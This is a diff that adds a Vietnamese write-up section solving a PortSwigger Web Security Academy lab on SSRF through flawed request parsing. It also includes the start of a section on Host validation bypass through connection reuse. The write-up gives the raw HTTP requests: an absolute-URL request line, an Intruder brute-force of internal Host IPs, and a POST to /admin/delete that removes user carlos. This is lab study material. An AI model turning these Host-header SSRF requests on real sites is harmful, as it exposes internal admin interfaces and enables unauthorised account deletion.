@@ -64,6 +64,34 @@ csrf=5dcGh6aSE9TEu9v545rRAs7WunnUtpLj&username=carlos
 Sau khi click submit, bài lab được giải.
 
 # 5. SSRF via flawed request parsing
+Nhận thấy việc thay đổi `Host` header sẽ dẫn đến request bị blocked. Tuy nhiên, gửi request với absolute path `GET https://0a52004d04fc3195c08d18de00ee00f9.web-security-academy.net` thì vẫn nhận được response là trang Home page. Khi đó, nếu ta thay đổi `Host` header thì sẽ không bị blocked nữa, mà thay vào đó sẽ không nhận được response.
+
+Gửi request sau vào Intruder:
+```
+GET https://0a52004d04fc3195c08d18de00ee00f9.web-security-academy.net/admin HTTP/2
+Host: 192.168.0.§0§
+...
+```
+Tiến hành brutefoce số cuối cùng của địa chỉ IP từ 0 đến 255, ta thấy với `Host: 192.168.0.201` thì nhận được response.
+
+![image](https://user-images.githubusercontent.com/103978452/223896261-81a0361e-f440-4065-bc4f-b5437405bdbf.png)
+
+Như vậy, ta cấu hình request sau:
+```
+GET https://0a52004d04fc3195c08d18de00ee00f9.web-security-academy.net/admin HTTP/2
+Host: 192.168.0.201
+...
+```
+Từ đó lấy được csrf token và biết rằng để xóa user carlos ta cần gửi request `POST /admin/delete` với hai tham số là csrf và username. Cấu hình request bên dưới:
+```
+POST https://0a52004d04fc3195c08d18de00ee00f9.web-security-academy.net/admin/delete HTTP/2
+Host: 192.168.0.201
+Content-Type: application/www-form-urlencoded
+...
+
+csrf=IGb4QkwVRAAkz904RH2hxu2SANG8Ff46&username=carlos
+```
+Sau khi submit, bài lab được giải thành công.
 
 # 6. Host validation bypass via connection state attack
 Sử dụng Burp Repeater để bắt request đến Home page. Nhận thấy khi thay đổi header `Host: 192.168.0.1` thì không có response được trả về. Tuy nhiên khi gửi request thông thường (Host header mặc định) trước rồi gửi request với header `Host: 192.168.0.1` thì kết quả lại thành công. Như vậy website đã reuse HTTP connection với Host header được coi là không đổi.
